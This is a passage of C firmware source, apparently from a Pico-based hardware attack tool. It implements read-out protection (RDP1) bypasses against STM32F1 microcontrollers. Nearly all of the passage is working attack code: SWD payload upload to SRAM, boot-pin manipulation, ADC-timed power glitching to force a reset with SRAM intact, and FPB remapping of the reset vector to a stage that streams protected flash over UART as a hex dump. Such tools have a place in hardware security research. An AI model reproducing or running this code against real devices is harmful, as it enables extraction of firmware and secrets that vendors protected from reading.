        uart_cli_send("ERROR: SWD connect failed\r\n");
        return;
    }
    swd_halt();

    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_led_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    // Verify write
    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, f103_led_payload, sizeof(f103_led_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // Resume core before floating SWD — C_HALT persists through system reset
    // so nRST alone won't unhalt. Must clear it via SWD first.
    swd_resume();
    swd_deinit();

    // Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode
    // Drive GPIOs directly — stm32_pwner_set_boot1() triggers full module init
    // which reinitializes power pin (GP10) as single output, breaking 3-pin gang
    #define BOOT0_PIN 13  // GP13
    #define BOOT1_PIN 14  // GP14
    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 1);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 1);

    // Step 3: Power glitch to trigger POR — boots from SRAM with BOOT0=1, BOOT1=1
    // Use sweep calibration if available, otherwise use provided/default values
    float thresh_v = voltage;
    if (sweep_calibrated) {
        thresh_v = sweep_optimal_thresh;
        uart_cli_printf("[3] Power glitch (sweep calibrated: %.2fV, max %lu attempts)...\r\n",
                        thresh_v, max_attempts);
    } else {
        uart_cli_printf("[3] Power glitch (default: %.2fV, max %lu attempts)...\r\n",
                        thresh_v, max_attempts);
        uart_cli_send("    (Run TARGET GLITCH SWEEP first for auto-calibration)\r\n");
    }

    // Ensure power pins are fully HIGH before glitching
    gpio_set_mask(POWER_MASK);
    sleep_ms(50);

    // Configure nRST as input with pull-up so we can detect BOR
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    adc_power_init();
    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);

    bool success = false;
    uint16_t adc_log[256];
    uint32_t adc_log_count = 0;
    glitch_result_t gr;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        // Custom glitch: ADC-controlled discharge + hold for debug POR latch
        nrst_irq_arm();

        gpio_set_dir(POWER_PIN2, GPIO_IN);
        gpio_set_dir(POWER_PIN3, GPIO_IN);
        gpio_disable_pulls(POWER_PIN2);
        gpio_disable_pulls(POWER_PIN3);

        adc_select_input(ADC_POWER_CHAN);
        gr.vmin_raw = 4095;
        gr.nrst_went_low = false;
        gr.thresh_reached = true;

        uint64_t t0 = time_us_64();
        gpio_clr_mask(1u << POWER_PIN1);

        // ADC-controlled discharge to sweep-calibrated threshold
        while (true) {
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
            if (val <= thresh) break;
            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
        }

        // Hold for debug domain POR latch (~50us)
        if (gr.thresh_reached) {
            sleep_us(50);
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
        }

        // Restore power
        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_set_mask(POWER_MASK);
        gr.glitch_us = (uint32_t)(time_us_64() - t0);

        // Monitor nRST for 50ms
        for (int i = 0; i < 5000; i++) {
            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
            sleep_us(10);
        }
        nrst_irq_disarm();
        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;

        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
                        attempt, vmin, gr.glitch_us,
                        gr.nrst_went_low ? "LOW" : "high");

        if (gr.nrst_went_low) {
            uart_cli_send("    BOR + POR latch — target should boot from SRAM\r\n");
            success = true;
            break;
        }

        // Re-stabilize power between attempts
        gpio_set_mask(POWER_MASK);
        sleep_ms(200);
    }

    // Ensure power is back on
    gpio_set_mask(POWER_MASK);

    if (success) {
        uart_cli_send("\r\nSUCCESS: Glitch triggered BOR with SRAM intact\r\n");
        uart_cli_send("BOOT0=HIGH, BOOT1=HIGH — target running from SRAM\r\n");
    } else {
        uart_cli_send("\r\nFAILED: Could not trigger BOR with intact SRAM\r\n");
        uart_cli_send("Try a higher voltage threshold to preserve SRAM\r\n");
        // Restore boot pins
        gpio_put(BOOT0_PIN, 0);
        gpio_put(BOOT1_PIN, 0);
    }
}

void target_power_bypass(uint32_t max_attempts, uint32_t dump_bytes) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    if (!sweep_calibrated) {
        uart_cli_send("ERROR: Run TARGET GLITCH SWEEP first for calibration\r\n");
        return;
    }

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(f103_rdp_bypass_payload) + 3) / 4;

    // Default to full flash if no count specified
    if (dump_bytes == 0)
        dump_bytes = info->flash_size;
    // Round up to word boundary
    dump_bytes = (dump_bytes + 3) & ~3u;

    uart_cli_printf("RDP1 bypass: %u byte payload -> 0x%08lX, dumping %lu bytes\r\n",
                    (unsigned)sizeof(f103_rdp_bypass_payload), sram_base, dump_bytes);
    uart_cli_printf("Sweep calibrated threshold: %.2fV\r\n", sweep_optimal_thresh);

    // === Step 1: Upload bypass payload to SRAM via SWD ===
    uart_cli_send("\r\n[1] Uploading bypass payload to SRAM...\r\n");
    swd_init();
    if (!swd_connect()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed\r\n");
        return;
    }
    swd_halt();

    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_rdp_bypass_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    // Verify write
    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, f103_rdp_bypass_payload, sizeof(f103_rdp_bypass_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    swd_resume();
    swd_deinit();

    // === Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode ===
    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 1);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 1);

    // === Step 3: Power glitch to trigger POR — stage 1 runs from SRAM ===
    float thresh_v = sweep_optimal_thresh;
    uart_cli_printf("[3] Power glitch for POR (threshold: %.2fV, max %lu attempts)...\r\n",
                    thresh_v, max_attempts);

    gpio_set_mask(POWER_MASK);
    sleep_ms(50);

    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    adc_power_init();
    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);

    bool stage1_ok = false;
    glitch_result_t gr;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        nrst_irq_arm();

        gpio_set_dir(POWER_PIN2, GPIO_IN);
        gpio_set_dir(POWER_PIN3, GPIO_IN);
        gpio_disable_pulls(POWER_PIN2);
        gpio_disable_pulls(POWER_PIN3);

        adc_select_input(ADC_POWER_CHAN);
        gr.vmin_raw = 4095;
        gr.nrst_went_low = false;
        gr.thresh_reached = true;

        uint64_t t0 = time_us_64();
        gpio_clr_mask(1u << POWER_PIN1);

        while (true) {
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
            if (val <= thresh) break;
            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
        }

        if (gr.thresh_reached) {
            sleep_us(50);
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
        }

        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_set_mask(POWER_MASK);
        gr.glitch_us = (uint32_t)(time_us_64() - t0);

        for (int i = 0; i < 5000; i++) {
            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
            sleep_us(10);
        }
        nrst_irq_disarm();
        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;

        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
                        attempt, vmin, gr.glitch_us,
                        gr.nrst_went_low ? "LOW" : "high");

        if (gr.nrst_went_low) {
            uart_cli_send("    POR triggered — stage 1 configuring FPB...\r\n");
            stage1_ok = true;
            break;
        }

        gpio_set_mask(POWER_MASK);
        sleep_ms(200);
    }

    gpio_set_mask(POWER_MASK);

    if (!stage1_ok) {
        uart_cli_send("\r\nFAILED: Could not trigger POR for stage 1\r\n");
        gpio_put(BOOT0_PIN, 0);
        gpio_put(BOOT1_PIN, 0);
        return;
    }

    // Wait for stage 1 to finish configuring FPB (LED goes solid)
    uart_cli_send("    Waiting for stage 1 to complete...\r\n");
    sleep_ms(500);

    // === Step 4: Init target UART for receiving dump ===
    uart_cli_send("[4] Initializing UART RX (GP5, 115200, 8N1)...\r\n");

    // Init UART1 for RX at 115200 baud (matches payload USART1 config)
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // === Step 5: Set BOOT0=0, pulse nRST — stage 2 sends flash via UART ===
    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST...\r\n");
    uart_cli_send("[6] Receiving flash dump via UART...\r\n");
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
    sleep_ms(10);

    // Drain FIFO before reset
    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    // Pulse nRST — system reset preserves FPB
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // Helper: receive exactly n bytes with timeout, returns bytes received
    #define BYPASS_TIMEOUT_US 5000000  // 5 second total timeout
    #define BYPASS_BYTE_TIMEOUT_US 500000  // 500ms idle = give up

    // --- Wait for "RDP1" header (scan byte-by-byte) ---
    uint8_t hdr_state = 0;  // matching "RDP1" character by character
    const char *hdr_str = "RDP1";
    uint64_t rx_start = time_us_64();
    uint64_t last_byte_time = rx_start;
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            last_byte_time = time_us_64();
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > BYPASS_TIMEOUT_US) break;
            if (hdr_state > 0 && (time_us_64() - last_byte_time > BYPASS_BYTE_TIMEOUT_US)) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"RDP1\" header not received — stage 2 may not be executing\r\n");
        goto bypass_cleanup;
    }
    uart_cli_send("    Header: RDP1\r\n");

    // --- Receive CPUID (4 bytes) ---
    uint8_t cpuid_buf[4];
    for (int i = 0; i < 4; i++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > BYPASS_BYTE_TIMEOUT_US) {
                uart_cli_send("ERROR: Timeout reading CPUID\r\n");
                goto bypass_cleanup;
            }
        }
        cpuid_buf[i] = uart_getc(TARGET_UART_ID);
    }
    uint32_t cpuid = cpuid_buf[0] | (cpuid_buf[1] << 8) |
                    (cpuid_buf[2] << 16) | (cpuid_buf[3] << 24);
    uint8_t implementer = (cpuid >> 24) & 0xFF;
    uint16_t partno = (cpuid >> 4) & 0xFFF;
    uart_cli_printf("    CPUID: 0x%08lX", cpuid);
    if (implementer == 0x41 && partno == 0xC23)
        uart_cli_printf(" (Cortex-M3 r%lup%lu)\r\n", (cpuid >> 20) & 0xF, cpuid & 0xF);
    else if (implementer == 0x41 && partno == 0xC24)
        uart_cli_send(" (Cortex-M4)\r\n");
    else
        uart_cli_send("\r\n");

    // --- Stream flash data, printing as we receive ---
    uart_cli_send("\r\n=== RDP1 BYPASS — FLASH DUMP ===\r\n");
    uart_cli_printf("Dumping %lu bytes from 0x08000000:\r\n", dump_bytes);

    uint32_t rx_total = 0;
    uint8_t line_buf[16];
    uint32_t line_pos = 0;

    while (rx_total < dump_bytes) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > BYPASS_BYTE_TIMEOUT_US) {
                // Flush partial line
                if (line_pos > 0) {
                    uint32_t line_addr = 0x08000000 + rx_total - line_pos;
                    uart_cli_printf("0x%08lX:", line_addr);
                    for (uint32_t j = 0; j < line_pos; j++)
                        uart_cli_printf(" %02X", line_buf[j]);
                    for (uint32_t j = line_pos; j < 16; j++)
                        uart_cli_send("   ");
                    uart_cli_send("  ");
                    for (uint32_t j = 0; j < line_pos; j++) {
                        char c = line_buf[j];
                        uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
                    }
                    uart_cli_send("\r\n");
                }
                uart_cli_printf("\r\nERROR: Timeout after %lu of %lu bytes\r\n", rx_total, dump_bytes);
                goto bypass_reset;
            }
        }
        line_buf[line_pos++] = uart_getc(TARGET_UART_ID);
        rx_total++;

        if (line_pos == 16 || rx_total == dump_bytes) {
            uint32_t line_addr = 0x08000000 + rx_total - line_pos;
            uart_cli_printf("0x%08lX:", line_addr);
            for (uint32_t j = 0; j < line_pos; j++)
                uart_cli_printf(" %02X", line_buf[j]);
            for (uint32_t j = line_pos; j < 16; j++)
                uart_cli_send("   ");
            uart_cli_send("  ");
            for (uint32_t j = 0; j < line_pos; j++) {
                char c = line_buf[j];
                uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            uart_cli_send("\r\n");
            line_pos = 0;
        }
    }

    uart_cli_printf("\r\nDump complete: %lu bytes received\r\n", rx_total);

bypass_reset:
    // Reset the target to stop the payload streaming
    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

bypass_cleanup:
    // Restore boot pins
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

// STM32F1 RDP1 bypass via SWD halt + FPB redirect (no power glitch needed)
// Connects under reset, writes payload + FPB config via SWD, then flash-boots
// with FPB redirecting reset vector to stage 2 UART dump code in SRAM.
void target_power_halt(uint32_t dump_bytes) {
    extern bool swd_connect_under_reset(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(f103_rdp_bypass_diag_payload) + 3) / 4;

    // Default to full flash if no count specified
    if (dump_bytes == 0)
        dump_bytes = info->flash_size;
    // Round up to word boundary
    dump_bytes = (dump_bytes + 3) & ~3u;

    // Stage 2 entry point (thumb address) — from payload ELF symbols
    // stage2_start is at offset 0x3AC from SRAM base (diag payload with FPB reader + STOP debug kill)
    const uint32_t stage2_thumb_addr = sram_base + 0x3AC + 1;  // +1 for thumb bit

    uart_cli_printf("RDP1 HALT bypass: %u byte diag payload -> 0x%08lX, dumping %lu bytes\r\n",
                    (unsigned)sizeof(f103_rdp_bypass_diag_payload), sram_base, dump_bytes);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    // === Step 1: Connect under reset, upload payload + configure FPB ===
    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    // Set BOOT0=0 now (flash boot mode for after release)
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    // === Step 2: Upload diag payload to SRAM ===
    uart_cli_send("[2] Uploading diag payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)f103_rdp_bypass_diag_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    // Verify write
    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, f103_rdp_bypass_diag_payload, sizeof(f103_rdp_bypass_diag_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    // === Step 3: Configure FPB via SWD ===
    uart_cli_send("[3] Configuring FPB via SWD...\r\n");

    // Write stage 2 thumb address to remap table at 0x20000020
    // (this overwrites part of the NOP sled, which is fine — stage 1 won't run)
    uint32_t remap_val = stage2_thumb_addr;
    if (swd_write_mem(sram_base + 0x20, &remap_val, 1) != 1) {
        uart_cli_send("ERROR: Failed to write remap table\r\n");
        swd_deinit();
        return;
    }

    // FP_CTRL (0xE0002000) = 0x03: ENABLE + KEY
    uint32_t fp_ctrl = 0x03;
    if (swd_write_mem(0xE0002000, &fp_ctrl, 1) != 1) {
        uart_cli_send("ERROR: Failed to write FP_CTRL\r\n");
        swd_deinit();
        return;
    }

    // FP_REMAP (0xE0002004) = 0x20: remap table at 0x20000020 (bits[28:5])
    uint32_t fp_remap = 0x20000020;
    if (swd_write_mem(0xE0002004, &fp_remap, 1) != 1) {
        uart_cli_send("ERROR: Failed to write FP_REMAP\r\n");
        swd_deinit();
        return;
    }

    // FP_COMP0 (0xE0002008) = 0x05: ENABLE + match address 0x04 (REPLACE=00 remap)
    uint32_t fp_comp0 = 0x05;
    if (swd_write_mem(0xE0002008, &fp_comp0, 1) != 1) {
        uart_cli_send("ERROR: Failed to write FP_COMP0\r\n");
        swd_deinit();
        return;
    }

    // Verify FPB config
    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002004, &verify_val, 1);
    uart_cli_printf("    FP_REMAP: 0x%08lX\r\n", verify_val);
    swd_read_mem(0xE0002008, &verify_val, 1);
    uart_cli_printf("    FP_COMP0: 0x%08lX\r\n", verify_val);
    swd_read_mem(sram_base + 0x20, &verify_val, 1);
    uart_cli_printf("    Remap[0]: 0x%08lX (stage 2 entry)\r\n", verify_val);

    // Clear VC_CORERESET so core doesn't re-halt on resume
    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    // === Step 4: Set PC to stage 1, resume, tri-state SWD ===
    uart_cli_send("[4] Running stage 1 (STOP/wake debug kill)...\r\n");
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);
    // Init UART before resume so we catch stage 1's diagnostic output
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // BMP cortexm_detach: 3-step DHCSR to clear C_DEBUGEN via DAP
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    uint32_t dhcsr_val;
    // Step 1: halt + debugen (ensure clean state)
    dhcsr_val = 0xA05F0003;  // DBGKEY | C_DEBUGEN | C_HALT
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    // Step 2: resume with debugen (clear C_HALT)
    dhcsr_val = 0xA05F0001;  // DBGKEY | C_DEBUGEN
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    // Step 3: clear C_DEBUGEN (core running, debug disabled)
    dhcsr_val = 0xA05F0000;  // DBGKEY only
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    // Tri-state SWD
    swd_deinit();

    // Wait for stage 1: clear debug + RTC setup + STOP + wake + UART report
    sleep_ms(200);

    // Read stage 1 diagnostic: "S1:X\n" where X = C_DEBUGEN after STOP/wake
    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    // === Step 5: Pulse nRST — FPB redirects reset vector to stage 2 ===
    uart_cli_send("[5] Pulsing nRST (flash boot with FPB redirect)...\r\n");
    uart_cli_send("[6] Receiving flash dump via UART...\r\n");

    // Drain FIFO before reset
    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    // Pulse nRST low then release — system reset preserves FPB
    uint8_t reset_pin = 15;  // GP15 = nRST
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // --- Wait for "RDP1" header (scan byte-by-byte) ---
    #define HALT_TIMEOUT_US 5000000     // 5 second total timeout
    #define HALT_BYTE_TIMEOUT_US 500000 // 500ms idle = give up

    uint8_t hdr_state = 0;
    const char *hdr_str = "RDP1";
    uint64_t rx_start = time_us_64();
    uint64_t last_byte_time = rx_start;
    bool hdr_found = false;

    while (!hdr_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            last_byte_time = time_us_64();
            if (c == hdr_str[hdr_state]) {
                hdr_state++;
                if (hdr_state == 4) hdr_found = true;
            } else {
                hdr_state = (c == 'R') ? 1 : 0;
            }
        } else {
            if (time_us_64() - rx_start > HALT_TIMEOUT_US) break;
            if (hdr_state > 0 && (time_us_64() - last_byte_time > HALT_BYTE_TIMEOUT_US)) break;
        }
    }

    if (!hdr_found) {
        uart_cli_send("ERROR: \"RDP1\" header not received — stage 2 may not be executing\r\n");
        uart_cli_send("  FPB may have been cleared by reset, or debug access was blocked\r\n");
        goto halt_cleanup;
    }
    uart_cli_send("    Header: RDP1\r\n");

    // --- Receive CPUID (4 bytes) ---
    uint8_t cpuid_buf[4];
    for (int i = 0; i < 4; i++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > HALT_BYTE_TIMEOUT_US) {
                uart_cli_send("ERROR: Timeout reading CPUID\r\n");
                goto halt_cleanup;
            }
        }
        cpuid_buf[i] = uart_getc(TARGET_UART_ID);
    }
    uint32_t cpuid = cpuid_buf[0] | (cpuid_buf[1] << 8) |
                    (cpuid_buf[2] << 16) | (cpuid_buf[3] << 24);
    uint8_t implementer = (cpuid >> 24) & 0xFF;
    uint16_t partno = (cpuid >> 4) & 0xFFF;
    uart_cli_printf("    CPUID: 0x%08lX", cpuid);
    if (implementer == 0x41 && partno == 0xC23)
        uart_cli_printf(" (Cortex-M3 r%lup%lu)\r\n", (cpuid >> 20) & 0xF, cpuid & 0xF);
    else if (implementer == 0x41 && partno == 0xC24)
        uart_cli_send(" (Cortex-M4)\r\n");
    else
        uart_cli_send("\r\n");

    // --- Receive "DIAG" marker (4 bytes) ---
    uint8_t diag_state = 0;
    const char *diag_str = "DIAG";
    bool diag_found = false;
    uint64_t diag_start = time_us_64();

    while (!diag_found) {
        if (uart_is_readable(TARGET_UART_ID)) {
            uint8_t c = uart_getc(TARGET_UART_ID);
            if (c == diag_str[diag_state]) {
                diag_state++;
                if (diag_state == 4) diag_found = true;
            } else {
                diag_state = (c == 'D') ? 1 : 0;
            }
        } else {
            if (time_us_64() - diag_start > HALT_BYTE_TIMEOUT_US) break;
        }
    }

    if (!diag_found) {
        uart_cli_send("WARNING: \"DIAG\" marker not received — may be non-diag payload\r\n");
    } else {
        // Read 7 diagnostic registers (4 bytes each, little-endian)
        uart_cli_send("\r\n=== DIAGNOSTIC REGISTERS ===\r\n");
        struct {
            const char *name;
            uint32_t addr;
            const char *desc;
        } diag_regs[] = {
            {"DHCSR",     0xE000EDF0, "C_DEBUGEN"},
            {"DEMCR",     0xE000EDFC, "VC_CORERESET"},
            {"FP_CTRL",   0xE0002000, "FPB enable"},
            {"FP_COMP0",  0xE0002008, "comparator 0"},
            {"VTOR",      0xE000ED08, "vector table"},
            {"FLASH_OBR", 0x4002201C, "RDP status"},
            {"RCC_CSR",   0x40021024, "reset flags"},
        };

        for (int reg = 0; reg < 7; reg++) {
            uint8_t reg_buf[4];
            bool reg_ok = true;
            for (int i = 0; i < 4; i++) {
                uint64_t t0 = time_us_64();
                while (!uart_is_readable(TARGET_UART_ID)) {
                    if (time_us_64() - t0 > HALT_BYTE_TIMEOUT_US) {
                        reg_ok = false;
                        break;
                    }
                }
                if (!reg_ok) break;
                reg_buf[i] = uart_getc(TARGET_UART_ID);
            }
            if (!reg_ok) {
                uart_cli_printf("  %s: TIMEOUT\r\n", diag_regs[reg].name);
                break;
            }
            uint32_t val = reg_buf[0] | (reg_buf[1] << 8) |
                          (reg_buf[2] << 16) | (reg_buf[3] << 24);
            uart_cli_printf("  %-10s (0x%08lX) = 0x%08lX", diag_regs[reg].name, diag_regs[reg].addr, val);

            // Decode key bits
            if (reg == 0) { // DHCSR
                uart_cli_printf("  C_DEBUGEN=%lu", val & 1);
                if (val & (1 << 1)) uart_cli_send(" C_HALT");
                if (val & (1 << 17)) uart_cli_send(" S_HALT");
            } else if (reg == 1) { // DEMCR
                uart_cli_printf("  VC_CORERESET=%lu TRCENA=%lu", val & 1, (val >> 24) & 1);
            } else if (reg == 2) { // FP_CTRL
                uart_cli_printf("  ENABLE=%lu NUM_CODE=%lu", val & 1, (val >> 4) & 0xF);
            } else if (reg == 3) { // FP_COMP0
                uart_cli_printf("  ENABLE=%lu COMP=0x%08lX", val & 1, val & ~3u);
            } else if (reg == 4) { // VTOR
                uart_cli_printf("  %s", val == 0 ? "FLASH" : (val == 0x20000000 ? "SRAM" : "OTHER"));
            } else if (reg == 5) { // FLASH_OBR
                uart_cli_printf("  RDPRT=%lu", (val >> 1) & 1);
            } else if (reg == 6) { // RCC_CSR
                uart_cli_send(" ");
                if (val & (1 << 26)) uart_cli_send("PIN_RST ");
                if (val & (1 << 27)) uart_cli_send("POR ");
                if (val & (1 << 28)) uart_cli_send("SW_RST ");
                if (val & (1 << 29)) uart_cli_send("IWDG ");
                if (val & (1 << 30)) uart_cli_send("WWDG ");
                if (val & (1 << 31)) uart_cli_send("LPWR ");
            }
            uart_cli_send("\r\n");
        }
        uart_cli_send("============================\r\n");
    }

    // --- Stream flash data ---
    uart_cli_send("\r\n=== RDP1 HALT BYPASS — FLASH DUMP ===\r\n");
    uart_cli_printf("Dumping %lu bytes from 0x08000000:\r\n", dump_bytes);

    uint32_t rx_total = 0;
    uint8_t line_buf[16];
    uint32_t line_pos = 0;

    while (rx_total < dump_bytes) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > HALT_BYTE_TIMEOUT_US) {
                if (line_pos > 0) {
                    uint32_t line_addr = 0x08000000 + rx_total - line_pos;
                    uart_cli_printf("0x%08lX:", line_addr);
                    for (uint32_t j = 0; j < line_pos; j++)
                        uart_cli_printf(" %02X", line_buf[j]);
                    for (uint32_t j = line_pos; j < 16; j++)
                        uart_cli_send("   ");
                    uart_cli_send("  ");
                    for (uint32_t j = 0; j < line_pos; j++) {
                        char c = line_buf[j];
                        uart_cli_printf("%c", (c >= 32 && c <= 126) ? c : '.');
                    }
                    uart_cli_send("\r\n");
                }
                uart_cli_printf("\r\nERROR: Timeout after %lu of %lu bytes\r\n", rx_total, dump_bytes);
